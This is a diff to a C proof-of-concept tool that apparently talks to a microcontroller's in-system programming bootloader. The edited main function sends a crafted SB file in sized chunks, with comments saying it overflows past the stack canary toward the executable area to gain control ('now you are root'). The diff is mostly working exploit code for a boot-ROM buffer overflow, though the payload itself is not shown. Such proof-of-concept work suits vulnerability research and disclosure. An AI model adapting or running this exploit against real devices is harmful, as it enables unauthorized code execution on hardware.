@@ -1,3 +1,7 @@
+/*
+ * A very minimal implementation of ISP to demonstrate a POC
+ * Not robust, not production ready
+ */
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -160,14 +164,14 @@ int send_data_packet(int port, uint8_t *data, int len, bool ack)
 	ret = write(port, &frame, sizeof(frame));
 
 	if (ret != sizeof(frame)) {
-		printf("haha1");
+		printf("Failed to write the frame");
 		exit(3);
 	}
 
 	ret = write(port, data, len);
 	fsync(port);
 	if (ret != len) {
-		printf("haha2");
+		printf("Failed to write the data");
 		exit(5);
 	}	
 
@@ -257,8 +261,6 @@ int read_response(int port, uint8_t response_type) {
 	if (return_val != 0) {
 		printf("ISP returned error %x\n", return_val);
 		exit(7);
-	} else {
-		printf("good response\n");
 	}
 	return 0;
 }
@@ -358,22 +360,21 @@ int main(int argc, char **argv) {
 	// Pass the size of our file
 	args[0] = size;
 
+
+	// 0x8 = The receive SB file
 	send_command(port,  0x8, args, 1);
 
+	// Read our standard response
 	read_response(port, (uint8_t)0xa0);
 
-	// send the first chunk of data
-	send_data(port, read_buffer, 0x4200);
-	// send the short packet
-	send_data(port, &read_buffer[0x4200], 0x1d0);
-	// now send our last packet
-	// send_data(port, &read_buffer[0x43d0], 512);
-	
+	// send everything up to our stack canary
+	send_data(port, read_buffer, 0x43d0);
+
+	// send the last packet which will overwrite the canary
+	// but get us just close enough to the executable area
 	send_data_packet(port, &read_buffer[0x43d0], 512, false);
 
 	printf("printf(\"now you are root\")\n");
 	// and now you are root
-
-	//read_response(port, (uint8_t)0xa0);
 }
 
